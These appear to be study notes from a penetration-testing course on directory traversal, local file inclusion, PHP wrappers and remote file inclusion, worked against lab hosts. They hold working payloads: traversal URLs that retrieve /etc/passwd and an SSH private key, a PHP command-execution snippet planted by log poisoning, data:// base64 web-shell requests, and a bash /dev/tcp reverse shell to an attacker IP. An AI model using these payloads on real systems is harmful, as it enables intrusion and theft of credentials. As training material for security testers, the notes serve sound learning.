# Common Web Application Attacks
Web development is currently one of the most in-demand skills in IT 
+ The combination of a shortage of skilled web developers, time constraints in projects, and rapidly changing technologies helps certain vulnerabilities occur repeatedly in a broad range of web applications
+ Regardless of the underlying technology stack, several common web application vulnerabilities can be found in a multitude of deployed applications

## Directory Traversal 

### Absolute vs Relative Paths 
To successfully exploit the vulnerabilities we'll face later in this Module, we need to specify paths to files we want to display, upload, include, or execute
+ Depending on the web application and vulnerability, we'll use either **absolute** or **relative** paths

To reference an **absolute** path, we specify the full file system path including all subdirectories
+ Can refer to an absolute path from any location in the filesystem
+ Absolute paths start with a forward slash (**/**), specifying the _root file system_ on Linux
	+ From there, we can navigate through the file system

For example, can begin in the home directory of the _kali_ user with the **pwd** command
```
kali@kali:~$ pwd
/home/kali

kali@kali:~$ ls /
bin   home            lib32       media  root  sys  vmlinuz
boot  initrd.img      lib64       mnt    run   tmp  vmlinuz.old
dev   initrd.img.old  libx32      opt    sbin  usr
etc   lib             lost+found  proc   srv   var


kali@kali:~$ cat /etc/passwd
root:x:0:0:root:/root:/usr/bin/zsh
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
...
king-phisher:x:133:141::/var/lib/king-phisher:/usr/sbin/nologin
kali:x:1000:1000:Kali,,,:/home/kali:/usr/bin/zsh
```
+ Our second command, **ls /**, lists all files and directories in the root file system
+ The output showing **etc** is located there
+ By specifying the **/** before **etc** in the third command, we use an absolute path originating from the root file system
+ This means we can use **/etc/passwd** from any location in the filesystem
+ If we were to omit the leading slash, the terminal would search for the **etc** directory in the home directory of the _kali_ user, since this is our current directory in the terminal

Next, let's use **relative** pathing to achieve the same goal
```
kali@kali:~$ pwd
/home/kali

kali@kali:~$ ls ../
kali

kali@kali:~$ ls ../../
bin   home            lib32       media  root  sys  vmlinuz
boot  initrd.img      lib64       mnt    run   tmp  vmlinuz.old
dev   initrd.img.old  libx32      opt    sbin  usr
etc   lib             lost+found  proc   srv   var
```
+ We'll display the contents of **/etc/passwd** using relative paths from the home directory of the _kali_ user
+ To move back one directory, we can use **../**. To move more than one directory backwards, we can combine multiple **../** sequences
+ We can use the **ls** command combined with one **../** sequence to list the contents of the **/home** directory, since **../** specifies one directory back
+ We'll then use two **../** sequences to list the contents of the root file system, which contains the **etc** directory

From this point, we can navigate as usual through the file system
```
kali@kali:~$ ls ../../etc
adduser.conf            debian_version  hostname        logrotate.d     passwd 
...
logrotate.conf  pam.d           rmt          sudoers       zsh


kali@kali:~$ cat ../../etc/passwd
root:x:0:0:root:/root:/usr/bin/zsh
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
...
king-phisher:x:133:141::/var/lib/king-phisher:/usr/sbin/nologin
kali:x:1000:1000:Kali,,,:/home/kali:/usr/bin/zsh
```
+ Can add **etc** to two **../** sequences to list all files and directories in the absolute path **/etc**
+ In the last command, we use **cat** to display the contents of the **passwd** file by combining the relative path (**../../etc/passwd**)

While we can use the **cat ../../etc/passwd** command shown in listing 3 to display the contents of **/etc/passwd**, we can achieve the same results using extra **../** sequences
```
kali@kali:~$ cat ../../../../../../../../../../../etc/passwd
root:x:0:0:root:/root:/usr/bin/zsh
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
...
king-phisher:x:133:141::/var/lib/king-phisher:/usr/sbin/nologin
kali:x:1000:1000:Kali,,,:/home/kali:/usr/bin/zsh
```
+ The number of **../** sequences is only relevant until we reach the root file system
+ Theoretically, we can add as many **../** as we want, since there is nowhere further back to go from **/**
+ This can be useful in certain situations, such as when we don't know our current working directory
+ In this case, we could specify a large number of **../** to ensure we reach the root file system from a relative pathing perspective

### Identifying and Exploiting Directory Traversals
Will explore _Directory Traversal_ attacks, also known as _path traversal_ attacks
+ This type of attack can be used to access sensitive files on a web server and typically occurs when a web application is not sanitizing user input

For a web application to show a specific page, a web server provides the file from the file system
+ These files can be located in the web root directory or one of its subdirectories
+ In Linux systems, the **/var/www/html/** directory is often used as the web root
+ When a web application displays a page, `http://example.com/file.html` for example, it will try to access **/var/www/html/file.html**
+ The http link doesn't contain any part of the path except the filename because the web root also serves as a base directory for a web server
+ If a web application is vulnerable to directory traversal, a user may access files outside of the web root by using relative paths, thus accessing sensitive files like SSH private keys or configuration files

While it is important to understand how to exploit Directory Traversal vulnerabilities, it is also crucial that we can *identify them*
+ We should always check for vulnerabilities by hovering over all buttons, checking all links, navigating to all accessible pages, and (if possible) examining the page's source code
+ Links can be an especially valuable source of information, providing parameters or other data about the application

For example, if we find the following link, we can extract vital information from it:
``` 
https://example.com/cms/login.php?language=en.html
```
+ First, **login.php** tells us the web application uses PHP
	+ We can use this information to develop assumptions about how the web application works, which is helpful for the exploitation phase
+ Second, the URL contains a _language_ parameter with an HTML page as its value
	+ In a situation like this, we should try to navigate to the file directly (`https://example.com/cms/en.html`)
	+ If we can successfully open it, we can confirm that **en.html** is a file on the server, meaning we can use this parameter to try other file names
	+ We *should always examine parameters closely when they use files as a value*
+ Third, the URL contains a directory called **cms**
	+ This is important information indicating that the web application is running in a subdirectory of the web root

#### Case Study - Mountain Desserts
We'll begin by examining the _Mountain Desserts_ web application
+ To access it, we'll need to update the **/etc/hosts** file on our Kali machine to use the DNS name
	+ We should be aware the assigned IP address for the target machine may change in the labs:
```
127.0.0.1       localhost
127.0.1.1       kali
192.168.50.16   mountaindesserts.com
...
```

Will browse to the target web application at `http://mountaindesserts.com/meteor/index.php`:
![[Pasted image 20230813204842.png]]
+ Above shows the page after we open it in a browser
+ The navigation bar displays a file named **index.php**, so we can conclude that the web application uses PHP
+ To gather more information about the page's structure, we should hover over all buttons and links, collecting information about parameters and the different pages we come across

Scrolling down and hovering over all buttons and links, we'll notice most of them only link to the page itself, as seen below: 
![[Pasted image 20230813205021.png]]

At the bottom of the page, will find a link labeled `Admin`:
![[Pasted image 20230813205049.png]]
+ It shows the link preview when we hover over the Admin link with our cursor, displaying the URL `http://mountaindesserts.com/meteor/index.php?page=admin.php`

We know the web application uses PHP and a parameter called "page", so let's assume this parameter is used to display different pages
+ PHP uses _$_GET_ to manage variables via a GET request
+ When we click on the link, we receive an error message stating the page is currently under maintenance:
![[Pasted image 20230813205225.png]]
+ This is an important detail for us, since it reveals that information is shown on the same page
+ In this case, we'll make a few assumptions about how the web application could be developed to behave in such a way
+ For example, when we open `mountaindesserts.com/meteor/admin.php` in our browser, we'll notice the same message that was shown on the **index.php** page after clicking the "Admin" link:
![[Pasted image 20230813205342.png]]

This message indicates the web application includes the content of this page via the _page_ parameter and displays it under the "Admin" link
+ Can now try to use **../** to traverse directories in the potentially-vulnerable parameter
+ We'll specify a relative path to **/etc/passwd** to test the _page_ parameter for directory traversal:
```
http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../etc/passwd
```

Will use that link in the address bar:
![[Pasted image 20230813205526.png]]
+ It shows the contents of **/etc/passwd** and successfully leveraged the directory traversal vulnerability by using a relative path

Directory traversal vulnerabilities are mostly used for gathering information
+ As mentioned before, if we can access certain files containing sensitive information, like passwords or keys, it may lead to system access

In most cases, the web server is run in the context of a dedicated user such as _www-data_
+ These users usually have limited access permissions on the system
+ However, users and administrators often intentionally set file access permissions to be very permissive or even world-readable
+ Sometimes this occurs due to time constraints in deployment or less-mature security programs
+ This means we should always check for the existence of SSH keys and their access permissions

*SSH keys* are usually located in the home directory of a user in the **.ssh** folder
+ Fortunately, **/etc/passwd** also contains the home directory paths of all users
+ The output of **/etc/passwd** shows a user called _offsec_
+ Can specify a relative path for the vulnerable "page" parameter to try and display the contents of the user's private key:
```
http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../home/offsec/.ssh/id_rsa
```
+ Can see the output in the browser:
![[Pasted image 20230814101452.png]]
+ Successfully retrieved the private key for the _offsec_ user, though the formatting is a bit messy

During web application assessments, we should understand that as soon as we've identified a possible vulnerability, such as with the "page" parameter in this case, we *should not rely on a browser for testing*
+ Browsers often try to parse or optimize elements for user friendliness
+ When performing web application testing, we should mainly use tools such as _Burp_, _cURL_, or a programming language of our choice

Will use **curl** to retrieve the SSH private key as we did with the browser:
```
kali@kali:~$ curl http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../home/offsec/.ssh/id_rsa
...
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEAz+pEKI1OmULVSs8ojO/sZseiv3zf2dbH6LSyYuj3AHkcxIND7UTw
XdUTtUeeJhbTC0h5S2TWFJ3OGB0zjCqsEI16ZHsaKI9k2CfNmpl0siekm9aQGxASpTiYOs
KCZOFoPU6kBkKyEhfjB82Ea1VoAvx4J4z7sNx1+wydQ/Kf7dawd95QjBuqLH9kQIEjkOGf
BemTOAyCdTBxzUhDz1siP9uyofquA5vhmMXWyy68pLKXpiQqTF+foGQGG90MBXS5hwskYg
...
lpWPWFQro9wzJ/uJsw/lepsqjrg2UvtrkAAADBAN5b6pbAdNmsQYmOIh8XALkNHwSusaK8
bM225OyFIxS+BLieT7iByDK4HwBmdExod29fFPwG/6mXUL2Dcjb6zKJl7AGiyqm5+0Ju5e
hDmrXeGZGg/5unGXiNtsoTJIfVjhM55Q7OUQ9NSklONUOgaTa6dyUYGqaynvUVJ/XxpBrb
iRdp0z8X8E5NZxhHnarkQE2ZHyVTSf89NudDoXiWQXcadkyrIXxLofHPrQzPck2HvWhZVA
+2iMijw3FvY/Fp4QAAAA1vZmZzZWNAb2Zmc2VjAQIDBA==
-----END OPENSSH PRIVATE KEY-----
...
```
+ Above shows that the SSH private key is formatted better using **curl** than in the browser
+ However, the HTML code of the web page is returned in the output as well
+ Will copy the SSH private key beginning at **-----BEGIN OPENSSH PRIVATE KEY-----** and ending at **-----END OPENSSH PRIVATE KEY-----** from the terminal and paste it into a file called **dt_key** in the home directory for the _kali_ user

Will use the private key to connect to the target system via SSH on port 2222
+ Can use the **-i** parameter to specify the stolen private key file and **-p** to specify the port
+ Before we can use the private key, we'll need to modify the permissions of the **dt_key** file so that only the user / owner can read the file; if we don't, the _ssh_ program will throw an error stating that the access permissions are too open:
```
kali@kali:~$ ssh -i dt_key -p 2222 offsec@mountaindesserts.com
The authenticity of host '[mountaindesserts.com]:2222 ([192.168.50.16]:2222)' can't be established.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
...
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@         WARNING: UNPROTECTED PRIVATE KEY FILE!          @
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
Permissions 0644 for '/home/kali/dt_key' are too open.
It is required that your private key files are NOT accessible by others.
This private key will be ignored.
...

kali@kali:~$ chmod 400 dt_key

kali@kali:~$ ssh -i dt_key -p 2222 offsec@mountaindesserts.com
...
offsec@68b68f3eb343:~$ 
```

#### Directory Traversal Attack on Windows 
On Windows, we can use the file **`C:\Windows\System32\drivers\etc\hosts`** to test directory traversal vulnerabilities, which is readable by all local users
+ **Note**: Windows uses backslashes instead of forward slashes for file paths. Therefore, **`..\`** is an important alternative to **`../`** on Windows targets
	+ While RFC 1738 specifies to always use slashes in a URL, we may encounter web applications on Windows which are only vulnerable to directory traversal using backslashes
+ By displaying this file, we can confirm the vulnerability exists and understand how the web application displays the contents of files
+ After confirming the vulnerability, we can try to specify files containing sensitive information such as configuration files and logs

In general, it is more difficult to leverage a directory traversal vulnerability for system access on Windows than Linux
+ In Linux systems, a standard vector for directory traversal is to list the users of the system by displaying the contents of **/etc/passwd**, check for private keys in their home directory, and use them to access the system via SSH
+ This vector is not available on Windows and unfortunately, there is no direct equivalent
+ Additionally, sensitive files are often not easily found on Windows without being able to list the contents of directories
+ This means to identify files containing sensitive information, we need to closely examine the web application and collect information about the web server, framework, and programming language

Once we gather information about the running application or service, we can research paths leading to sensitive files
+ For example, if we learn that a target system is running the _Internet Information Services_ (IIS) web server, can research its log paths and web root structure
	+ Reviewing the Microsoft documentation, we learn that the *logs* are located at `C:\inetpub\logs\LogFiles\W3SVC1\`. Another file we should always check when the target is running an IIS web server is `C:\inetpub\wwwroot\web.config`, which may *contain sensitive information* like passwords or usernames
+ File upload vulnerabilities on windows can often use the route `C:\inetpub\wwwroot` to put files into the root directory, such as a backdoor 
	+ ASP.NET backdoor: `/usr/share/davtest/backdoors/aspx_cmd.aspx` 
	+ Can run commands by simply browsing to `http://IP/aspx_cmd.aspx`

### Encoding Special Characters 
In the "Vulnerability Scanning" topic, we scanned the SAMBA machine and identified a directory traversal vulnerability in Apache 2.4.49
+ This vulnerability can be exploited by using a relative path after specifying the **cgi-bin** directory in the URL

Will use **curl** and multiple **../** sequences to try exploiting this directory traversal vulnerability in Apache 2.4.49 on the _WEB18_ machine:
```
kali@kali:/var/www/html$ curl http://192.168.50.16/cgi-bin/../../../../etc/passwd

<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL was not found on this server.</p>
</body></html>


kali@kali:/var/www/html$ curl http://192.168.50.16/cgi-bin/../../../../../../../../../../etc/passwd

<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL was not found on this server.</p>
</body></html>
```
+ Above demonstrates that after attempting two queries with a different number of **../**, we could not display the contents of **/etc/passwd** via directory traversal
+ Because leveraging **../** is a known way to abuse web application behavior, this sequence is often filtered by either the web server, web application firewalls, or the web application itself 

Fortunately for us, we can use _URL Encoding_, also called _Percent Encoding_, to potentially bypass these filters
+ Can leverage specific ASCII encoding lists to manually encode our query, or use the online converter on the same page
+ For now, we will only encode the dots, which are represented as `%2e`: 
```
kali@kali:/var/www/html$ curl http://192.168.50.16/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
...
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
alfred:x:1000:1000::/home/alfred:/bin/bash
```
+ We have successfully used directory traversal with encoded dots to display the contents of **/etc/passwd** on the target machine

Generally, URL encoding is used to convert characters of a web request into a format that can be transmitted over the internet
+ However, it is also a popular method used for malicious purposes
+ The reason for this is that the encoded representation of characters in a request may be missed by filters, which only check for the plain-text representation of them e.g. **../** but not **%2e%2e/**
+ After the request passes the filter, the web application or server interprets the encoded characters as a valid request

## File Inclusion Vulnerabilities 

### Local File Inclusion (LFI)
Before we examine _Local File Inclusion_ (LFI), let's take a moment to explore the differences between File Inclusion and Directory Traversal
+ These two concepts often get mixed up by penetration testers and security professionals
+ If we confuse the type of vulnerability we find, we may miss an opportunity to obtain code execution

Can use directory traversal vulnerabilities to obtain the contents of a file outside of the web server's web root
+ _File inclusion_ vulnerabilities allow us to "include" a file in the application's running code
+ This means we can use *file inclusion* vulnerabilities to *execute local or remote files*
+ *Directory traversal* only allows us to *read the contents of a file*
+ Since we can include files in the application's running code with file inclusion vulnerabilities, we can also display the file contents of non-executable files
	+ For example, if we leverage a *directory traversal vulnerability* in a PHP web application and specify the file **admin.php**, the source code of the PHP file will be *displayed*
	+ On the other hand, when dealing with a *file inclusion vulnerability*, the **admin.php** file will be *executed* instead

In the following example, our goal is to obtain _Remote Code Execution_ (RCE) via an LFI vulnerability
+ We will do this with the help of _Log Poisoning_
+ Log Poisoning works by modifying data we send to a web application so that the logs contain executable code
+ In an LFI vulnerability scenario, the local file we include is executed if it contains executable content
+ This means that if we manage to write executable code to a file and include it within the running code, it will be executed

#### Case Study - Apache Logs
In the following case study, we will try to write executable code to Apache's **access.log** file in the **/var/log/apache2/** directory
+ We'll first need to review what information is controlled by us and saved by Apache in the related log
	+ In this case, "controlled" means that we can modify the information before we send it to the web application
+ We can either read the Apache web server documentation or display the file via LFI

Will use **curl** to analyze which elements comprise a log entry by displaying the file **access.log** using the previously-found directory traversal vulnerability
+ This means we'll use the relative path of the log file in the vulnerable "page" parameter in the "Mountain Desserts" web application:
```
kali@kali:~$ curl http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../var/log/apache2/access.log
...
192.168.50.1 - - [12/Apr/2022:10:34:55 +0000] "GET /meteor/index.php?page=admin.php HTTP/1.1" 200 2218 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0"
...
```
+ It shoes the user agent is included in the log entry 
+ Before we send a request, we can modify the User Agent in Burp and specify what will be written to the **access.log** file

Apart from the specified file, this command is equivalent to the directory traversal attack
+ The exploitation of directory traversal and LFI vulnerabilities mainly differs when handling executable files or content

 In Burp, will open the browser, and navigate to the "Mountain Desserts" web page
 + Will click on the _Admin_ link at the bottom of the page, then switch back to Burp and click on the _HTTP history_ tab and then send it to repeater:
![[Pasted image 20230814153001.png]]
+ Can now modify the User Agent to include the PHP code snippet of the following listing
+ This snippet accepts a command via the _cmd_ parameter and executes it via the PHP _system_ function on the target system. We'll use _echo_ to display command output:
``` php
<?php echo system($_GET['cmd']); ?>
```
+ Can execute a php file with:
```php
<?php exec(php '/opt/lampp/htdocs/stuff/name.php'); ?>
```

After modifying the User Agent, will send the payload:
![[Pasted image 20230814153102.png]]
+ The PHP code snippet was written to Apache's **access.log** file. By including the log file via the LFI vulnerability, we can execute the PHP code snippet

To execute our snippet, we'll first update the _page_ parameter in the current Burp request with a relative path:
```
../../../../../../../../../var/log/apache2/access.log
```
+ We also need to add the _cmd_ parameter to the URL to enter a command for the PHP snippet
+ First, let's enter the **ps** command to verify that the log poisoning is working
+ Since we want to provide values for the two parameters (_page_ for the relative path of the log and _cmd_ for our command), we can use an ampersand (&) as a delimiter
+ We'll also remove the User Agent line from the current Burp request to avoid poisoning the log again, which would lead to multiple executions of our command due to two PHP snippets included in the log

The final Burp request is shown in the _Request_ in the following
+ Will review the output of the request:
![[Pasted image 20230814153347.png]]
+ It shows the output of the executed **ps** command that was written to the **access.log** file due to our poisoning with the PHP code snippet

Will update the command parameter with **ls -la**:
![[Pasted image 20230814153430.png]]
+ The output in the _Response_ section shows that our input triggers an error
+ This happens due to the space between the command and the parameters
+ There are different techniques we can use to bypass this limitation, such as using Input Field Separators (IFS) or URL encoding 
+ With URL encoding, a space is represented as `%20` and will replace the space with that in the following:
![[Pasted image 20230814153518.png]]
+ It can be seen that this made our command execute correctly 

We have achieved command execution on the target system and can leverage this to get a *reverse shell* or add our SSH key to the **authorized_keys** file for a user
+ Can attempt to obtain a reverse shell by adding a command to the _cmd_ parameter
+ Can use a common Bash TCP reverse shell one-liner, where the target IP will need to be updated based on the attacker IP:
``` bash
bash -i >& /dev/tcp/192.168.119.3/4444 0>&1
```

Since we'll execute our command through the PHP _system_ function, we should be aware that the command may be executed via the _Bourne Shell_
+ Also known as _sh_, rather than Bash
+ The reverse shell one-liner above contains syntax that is not supported by the Bourne Shell
+ To ensure the reverse shell is executed via Bash, we need to modify the reverse shell command

We can do this by providing the reverse shell one-liner as argument to **bash -c**, which executes a command with Bash: 
``` bash
bash -c "bash -i >& /dev/tcp/192.168.119.3/4444 0>&1"
```
+ Will then encode the special characters with URL encoding:
```
bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.119.3%2F4444%200%3E%261%22
```

The following figure shows the correct way to add our command in the request:
![[Pasted image 20230814155430.png]]
+ Before we send the request, let's start a _Netcat_ listener on port 4444 on our Kali machine
+ It will receive the incoming reverse shell from the target system
+ Once the listener is started, we can press _Send_ in Burp to send the request:
```
kali@kali:~$ nc -nvlp 4444
listening on [any] 4444 ...
connect to [192.168.119.3] from (UNKNOWN) [192.168.50.16] 57848
bash: cannot set terminal process group (24): Inappropriate ioctl for device
bash: no job control in this shell
www-data@fbea640f9802:/var/www/html/meteor$ ls
admin.php
bavarian.php
css
fonts
img
index.php
js
```
+ It shows that we successfully received the reverse shell in our Netcat listener
+ We now have an interactive shell on the target system

After obtaining a reverse shell, can *check sudo permissions* with `sudo -l`
+ for example, the following means you can use sudo for any application with no password:
```
User www-data may run the following commands on 01ab3f30f277:
	(ALL:ALL)ALL
	(ALL)NOPASSWD:ALL
```


#### LFI Attacks on Windows 
Exploiting LFI on Windows only differs from Linux when it comes to file paths and code execution
+ The PHP code snippet we used in this section for Linux also works on Windows, since we use the PHP system function that is independent from the underlying operating system
+ When we use Log Poisoning on Windows, we should understand that the log files are located in application-specific paths
+ For example, on a target running _XAMPP_, the Apache logs can be found in **`C:\xampp\apache\logs\`**

Exploiting File Inclusion vulnerabilities depends heavily on the web application's programming language, the version, and the web server configuration
+ Outside PHP, we can also leverage LFI and RFI vulnerabilities in other frameworks or server-side scripting languages including _Perl_, _Active Server Pages Extended_, _Active Server Pages_, and _Java Server Pages_
+ Exploiting these kinds of vulnerabilities is very similar across these languages

Consider an LFI vulnerability in a JSP web application
+ If we can write JSP code to a file using Log Poisoning and include this file with the LFI vulnerability, the code will be executed
+ The only difference between this example and the previous PHP demonstration is that the code snippet used for the Log Poisoning would be in a different language

In real-life assessments, we'll most often discover File Inclusion vulnerabilities in PHP web applications, since most of the other frameworks and server-side scripting languages are dated and therefore less common
+ Additionally, modern frameworks and languages are often by design not vulnerable or have protection mechanisms enabled by default against LFI
+ However, we should be aware that we can also find LFI vulnerabilities in modern back-end JavaScript runtime environments like _Node.js_

### PHP Wrappers 
PHP offers a variety of protocol wrappers to enhance the language's capabilities
+ For example, PHP wrappers can be used to represent and access local or remote filesystems
+ We can use these wrappers to bypass filters or obtain code execution via _File Inclusion_ vulnerabilities in PHP web applications
+ Will only examine the `php://filter` and `data://` wrappers, but many are available

The <mark style="background: #D2B3FFA6;">base64</mark> command will be helpful here (Note that `-n` means: "do not output the trailing newline")
+ Can convert a string to base64 with: `echo -n "<STRING>" | base64`
+ Can decode a base64 string with: `echo -n "QmFzZTY0U3RyaW5nVGVzdA==" | base64 -d` 
#### php://filter
Can use the **php://filter** wrapper to display the contents of files either with or without encodings like _ROT13_ or _Base64_
+ Using **php://filter**, we can also display the contents of executable files such as **.php**, rather than executing them
+ This allows us to review PHP files for sensitive information and analyze the web application's logic

Will demonstrate by revisiting the "Mountain Desserts" web application
+ First we'll provide the **admin.php** file as a value for the "page" parameter:
```
kali@kali:~$ curl http://mountaindesserts.com/meteor/index.php?page=admin.php
...
<a href="index.php?page=admin.php"><p style="text-align:center">Admin</p></a>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Maintenance</title>
</head>
<body>
        <span style="color:#F00;text-align:center;">The admin page is currently under maintenance.
```
+ Above shows the title and maintenance text we already encountered while reviewing the web application earlier
+ We also notice that the _`<body>`_ tag is not closed at the end of the HTML code, so we can assume that something is missing
+ PHP code will be executed server side and, as such, is not shown
+ When we compare this output with previous inclusions o?pagr review the source code in the browser, we can conclude that the rest of the **index.php** page's content is missing

Will now include the file, using **php://filter** to better understand this situation
+ Will not use any encoding on our first attempt
+ The PHP wrapper uses **resource** as the required parameter to specify the file stream for filtering, which is the filename in our case
	+ Can also specify absolute or relative paths in this parameter:
```
kali@kali:~$ curl http://mountaindesserts.com/meteor/index.php?page=php://filter/resource=admin.php
...
<a href="index.php?page=admin.php"><p style="text-align:center">Admin</p></a>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Maintenance</title>
</head>
<body>
        <span style="color:#F00;text-align:center;">The admin page is currently under maintenance.
```
+ This shows the dame listing as before
+ This makes sense since the PHP code is included and *executed via the LFI vulnerability*

Let's now encode the output with base64 by adding **convert.base64-encode**
+ This converts the specified resource to a base64 string
```
kali@kali:~$ curl http://mountaindesserts.com/meteor/index.php?page=php://filter/convert.base64-encode/resource=admin.php
...
<a href="index.php?page=admin.php"><p style="text-align:center">Admin</p></a>
PCFET0NUWVBFIGh0bWw+CjxodG1sIGxhbmc9ImVuIj4KPGhlYWQ+CiAgICA8bWV0YSBjaGFyc2V0PSJVVEYtOCI+CiAgICA8bWV0YSBuYW1lPSJ2aWV3cG9ydCIgY29udGVudD0id2lkdGg9ZGV2aWNlLXdpZHRoLCBpbml0aWFsLXNjYWxlPTEuMCI+CiAgICA8dGl0bGU+TWFpbn...
dF9lcnJvcik7Cn0KZWNobyAiQ29ubmVjdGVkIHN1Y2Nlc3NmdWxseSI7Cj8+Cgo8L2JvZHk+CjwvaHRtbD4K
...
```
+ This included base64 encoded data while the rest of the page loaded correctly. 
+ We can now use the _base64_ program with the _-d_ flag to decode the encoded data in the terminal

``` 
kali@kali:~$ echo "PCFET0NUWVBFIGh0bWw+CjxodG1sIGxhbmc9ImVuIj4KPGhlYWQ+CiAgICA8bWV0YSBjaGFyc2V0PSJVVEYtOCI+CiAgICA8bWV0YSBuYW1lPSJ2aWV3cG9ydCIgY29udGVudD0id2lkdGg9ZGV2aWNlLXdpZHRoLCBpbml0aWFsLXNjYWxlPTEuMCI+CiAgICA8dGl0bGU+TWFpbnRlbmFuY2U8L3RpdGxlPgo8L2hlYWQ+Cjxib2R5PgogICAgICAgIDw/cGhwIGVjaG8gJzxzcGFuIHN0eWxlPSJjb2xvcjojRjAwO3RleHQtYWxpZ246Y2VudGVyOyI+VGhlIGFkbWluIHBhZ2UgaXMgY3VycmVudGx5IHVuZGVyIG1haW50ZW5hbmNlLic7ID8+Cgo8P3BocAokc2VydmVybmFtZSA9ICJsb2NhbGhvc3QiOwokdXNlcm5hbWUgPSAicm9vdCI7CiRwYXNzd29yZCA9ICJNMDBuSzRrZUNhcmQhMiMiOwoKLy8gQ3JlYXRlIGNvbm5lY3Rpb24KJGNvbm4gPSBuZXcgbXlzcWxpKCRzZXJ2ZXJuYW1lLCAkdXNlcm5hbWUsICRwYXNzd29yZCk7CgovLyBDaGVjayBjb25uZWN0aW9uCmlmICgkY29ubi0+Y29ubmVjdF9lcnJvcikgewogIGRpZSgiQ29ubmVjdGlvbiBmYWlsZWQ6ICIgLiAkY29ubi0+Y29ubmVjdF9lcnJvcik7Cn0KZWNobyAiQ29ubmVjdGVkIHN1Y2Nlc3NmdWxseSI7Cj8+Cgo8L2JvZHk+CjwvaHRtbD4K" | base64 -d
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Maintenance</title>
</head>
<body>
        <?php echo '<span style="color:#F00;text-align:center;">The admin page is currently under maintenance.'; ?>

<?php
$servername = "localhost";
$username = "root";
$password = "M00nK4keCard!2#";

// Create connection
$conn = new mysqli($servername, $username, $password);
...
```
+ The decoded data contains _MySQL_ connection information, including a username and password
	+ Can use these credentials to connect to the database or try the password for user accounts via SSH

#### data://
While the **php://filter** wrapper can be used to include the contents of a file, we can use the **data://** wrapper to achieve *code execution*
+ This wrapper is used to embed data elements as plaintext or base64-encoded data in the running web application's code
+ This offers an alternative method when we cannot poison a local file with PHP code

Will demonstrate how to use the **data://** wrapper with the "Mountain Desserts" web application
+ To use the wrapper, we'll add **data://** followed by the data type and content
+ In our first example, we will try to embed a small URL-encoded PHP snippet into the web application's code
+ We can use the same PHP snippet as previously with **ls** the command
```
kali@kali:~$ curl "http://mountaindesserts.com/meteor/index.php?page=data://text/plain,<?php%20echo%20system('ls');?>"
...
<a href="index.php?page=admin.php"><p style="text-align:center">Admin</p></a>
admin.php
bavarian.php
css
fonts
img
index.php
js
...
```
+ Above shows that our embedded data was successfully executed via the File Inclusion vulnerability and **data://** wrapper

When web application firewalls or other security mechanisms are in place, they may filter strings like "system" or other PHP code elements
+ In such a scenario, we can try to use the **data://** wrapper with base64-encoded data
+ We'll first encode the PHP snippet into base64, then use **curl** to embed and execute it via the **data://** wrapper
```
kali@kali:~$ echo -n '<?php echo system($_GET["cmd"]);?>' | base64
PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==


kali@kali:~$ curl "http://mountaindesserts.com/meteor/index.php?page=data://text/plain;base64,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls"
...
<a href="index.php?page=admin.php"><p style="text-align:center">Admin</p></a>
admin.php
bavarian.php
css
fonts
img
index.php
js
start.sh
...
```
+ Above shows that we successfully achieved code execution with the base64-encoded PHP snippet
	+ This is a handy technique that may help us bypass basic filters
	+ However, we need to be aware that the **data://** wrapper will not work in a default PHP installation
	+ To exploit it, the _allow_url_include_ setting needs to be enabled

### Remote File Inclusion (RFI)
*Remote file inclusion* (**RFI**) vulnerabilities are less common than LFIs since the target system must be configured in a specific way
+ In PHP web applications, for example, the **allow_url_include** option needs to be enabled to leverage RFI, just as with the **data://** wrapper
+ As stated, it is disabled by default in all current versions of PHP
+ While LFI vulnerabilities can be used to include local files, RFI vulnerabilities allow us to include files from a remote system over _HTTP_ or _SMB_
+ The included file is also executed in the context of the web application
+ Common scenarios where we'll find this option enabled is when the web application loads files or contents from remote systems e.g. libraries or application data
+ Can discover RFI vulnerabilities using the same techniques covered in the Directory Traversal and LFI sections

